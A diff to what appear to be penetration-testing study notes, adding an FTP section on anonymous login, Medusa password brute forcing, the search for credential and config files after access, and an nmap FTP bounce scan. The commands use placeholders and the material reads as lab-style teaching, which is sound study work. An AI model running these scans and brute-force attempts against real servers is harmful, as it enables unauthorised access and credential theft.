@@ -534,13 +534,198 @@ Two key elements for finding sensitive information:
 <details>
 <summary><h1>📄 FTP</h1></summary>
 
+The **File Transfer Protocol (FTP)** is a standard network protocol used to transfer files between computers.
+It also supports file system operations such as:
+
+* Changing the working directory
+* Listing files
+* Renaming files or directories
+* Deleting files or directories
+
+**Default Port:**
+* TCP/21
+
+**Common Uses**
+* Moving files between systems in software development environments
+* Updating or deploying website content
+* Sharing large datasets within an organization
+
 <details>
-<summary><h2>Attacking FTP</h2></summary>
+<summary><h2>Attack Vectors</h2></summary>
+
+When targeting an FTP server, there are several possible approaches:
+
+1. **Misconfiguration or Excessive Privileges**
+    * Anonymous access enabled
+    * Improper file/directory permissions
+    * Sensitive files stored in publicly accessible directories
+
+2. **Exploiting Known Vulnerabilities**
+    * Outdated FTP server software
+    * Weak authentication mechanisms
+
+3. **Discovering New Vulnerabilities**
+    * Protocol-specific flaws
+    * Vendor-specific bugs
 
 </details>
 
 <details>
-<summary><h2>Latest FTP Vulnerabilities</h2></summary>
+<summary><h2>Post-Access Actions</h2></summary>
+
+Once access is gained, you should:
+
+* **Enumerate the directory contents** to identify sensitive or critical files
+
+* **Check folder structure** — FTP typically uses a hierarchical directory structure:
+
+* **Search for sensitive files**, such as:
+    * Configuration files (`config.php`, `.env`)
+    * Database dumps (`backup.sql`)
+    * Source code files
+    * Credentials
+
+</details>
+
+<details>
+<summary><h2>Nmap Scan</h2></summary>
+
+**Example Command**
+
+```bash
+sudo nmap -sC -sV -p 21 <TARGET_IP>
+```
+
+| Flag            | Purpose                                         |
+|-----------------|-------------------------------------------------|
+| `-sC`           | Run default NSE scripts (includes `ftp-anon`)   |
+| `-sV`           | Detect service version and banner               |
+| `-p 21`         | Scan only TCP port 21                           |
+| `<TARGET_IP>` | Target IP address                               |
+
+**Why This Matters**
+* **Anonymous access** may expose files without authentication.
+* **Version information** helps identify:
+    * Known vulnerabilities
+    * Possible exploits for the specific FTP server software
+
+</details>
+
+<details>
+<summary><h2>Misconfigurations</h2></summary>
+
+As discussed earlier, **anonymous authentication** can be enabled for services such as FTP.  
+This can create serious security risks if not configured properly.
+
+How Anonymous FTP Login Works
+* **Username:** `anonymous`
+* **Password:** *(empty)*
+
+**Potential Risks**
+If read/write permissions are **not** configured correctly:
+* Sensitive files might be stored in folders accessible to anonymous users.
+* Anyone could **download confidential data** without authentication.
+* Attackers could **upload malicious scripts** to the server.
+
+**Example Command**
+
+```bash
+ftp <TARGET_IP> <PORT>
+```
+
+**Example Output**
+
+```bash
+# Connected to <TARGET_IP>.
+# 220 (vsFTPd 2.3.4)
+# Name (<TARGET_IP>:kali): anonymous
+# 331 Please specify the password.
+# Password:
+# 230 Login successful.
+# Remote system type is UNIX.
+# Using binary mode to transfer files.
+
+# ftp> ls
+
+# 200 PORT command successful. Consider using PASV.
+# 150 Here comes the directory listing.
+# -rw-r--r--    1 0        0               9 Aug 12 16:51 test.txt
+# 226 Directory send OK.
+```
+
+</details>
+
+<details>
+<summary><h2>Brute Forcing with Medusa</h2></summary>
+
+**Example Command: **
+
+```bash
+medusa -u <USER_LIST> -P <PASSWORD_LIST> -h <TARGET_IP> -M ftp -n <PORT>
+```
+
+**Example Output**
+
+```bash
+# Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>                                                      
+# ACCOUNT CHECK: [ftp] Host: <TARGET_IP> (1 of 1, 0 complete) User: <USER> (1 of 1, 0 complete) Password: 123456 (1 of 14344392 complete)
+# ACCOUNT CHECK: [ftp] Host: <TARGET_IP> (1 of 1, 0 complete) User: <USER> (1 of 1, 0 complete) Password: 12345 (2 of 14344392 complete)
+# ACCOUNT CHECK: [ftp] Host: <TARGET_IP> (1 of 1, 0 complete) User: <USER> (1 of 1, 0 complete) Password: 123456789 (3 of 14344392 complete)
+# ACCOUNT FOUND: [ftp] Host: <TARGET_IP> User: <USER> Password: <PASSWORD> [SUCCESS]
+```
+
+</details>
+
+<details>
+<summary><h2>FTP Bounce Attack</h2></summary>
+
+An **FTP bounce attack** is a technique that abuses FTP servers to send network traffic to another device.  
+This is achieved by manipulating the `PORT` command to make the FTP server connect to a different target.
+
+**How It Works**
+
+1. The attacker connects to an **FTP server** that is exposed to the internet (e.g., `FTP_DMZ`).
+2. They use the `PORT` command to instruct the FTP server to interact with another host on the same internal network (e.g., `Internal_DMZ`).
+3. The FTP server unknowingly **proxies requests** to the internal host.
+4. This allows the attacker to:
+   * Scan internal hosts
+   * Identify open ports
+   * Gather information for further exploitation
+
+**Example Command**
+
+```bash
+nmap -Pn -v -n -p80 -b <USER>:<PASSWORD>@<ATTACKER_IP> <TARGET_IP>
+```
+
+**Example Output**
+
+```bash
+# Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-27 04:55 EDT
+# Resolved FTP bounce attack proxy to <ATTACKER_IP> (<ATTACKER_IP>).
+# Attempting connection to ftp://anonymous:password@<ATTACKER_IP>:21
+# Connected: 220 (vsFTPd 3.0.3)
+# Login credentials accepted by FTP server!
+# Initiating Bounce Scan at 04:55
+# FTP command misalignment detected ... correcting.
+# Completed Bounce Scan at 04:55, 0.54s elapsed (1 total ports)
+
+# Nmap scan report for <TARGET_IP>
+# Host is up.
+
+# PORT   STATE  SERVICE
+# 80/tcp open  http
+```
+
+| **Flag** | **Purpose** |
+|----------|-------------|
+| `-Pn`    | Skip host discovery, treat all hosts as online. |
+| `-v`     | Verbose output. |
+| `-n`     | Disable DNS resolution. |
+| `-p80`   | Scan only TCP port 80. |
+| `-b`     | Perform FTP bounce scan (`user:pass@ftp_server target_ip`). |
+
+> **NOTE:** FTP bounce attacks are deprecated in many modern FTP servers, but vulnerable implementations still exist in outdated or misconfigured environments.
 
 </details>
 
@@ -551,15 +736,7 @@ Two key elements for finding sensitive information:
 <details>
 <summary><h1>🗃️ SMB</h1></summary>
 
-<details>
-<summary><h2>Attacking FTP</h2></summary>
 
-</details>
-
-<details>
-<summary><h2>Latest FTP Vulnerabilities</h2></summary>
-
-</details>
 
 </details>
 
@@ -568,15 +745,7 @@ Two key elements for finding sensitive information:
 <details>
 <summary><h1>🛢️ SQL Databases</h1></summary>
 
-<details>
-<summary><h2>Attacking SQL Databases</h2></summary>
 
-</details>
-
-<details>
-<summary><h2>Latest SQL Vulnerabilities</h2></summary>
-
-</details>
 
 </details>
 
@@ -585,15 +754,7 @@ Two key elements for finding sensitive information:
 <details>
 <summary><h1>🖧 RDP</h1></summary>
 
-<details>
-<summary><h2>Attacking RDP</h2></summary>
 
-</details>
-
-<details>
-<summary><h2>Latest RDP Vulnerabilities</h2></summary>
-
-</details>
 
 </details>
 
@@ -602,15 +763,7 @@ Two key elements for finding sensitive information:
 <details>
 <summary><h1>🌐 DNS</h1></summary>
 
-<details>
-<summary><h2>Attacking DNS</h2></summary>
 
-</details>
-
-<details>
-<summary><h2>Latest DNS Vulnerabilities</h2></summary>
-
-</details>
 
 </details>
 
@@ -619,15 +772,7 @@ Two key elements for finding sensitive information:
 <details>
 <summary><h1>📨 SMTP</h1></summary>
 
-<details>
-<summary><h2>Attacking Email</h2></summary>
 
-</details>
-
-<details>
-<summary><h2>Latest Email Service Vulnerabilities</h2></summary>
-
-</details>
 
 </details>
 
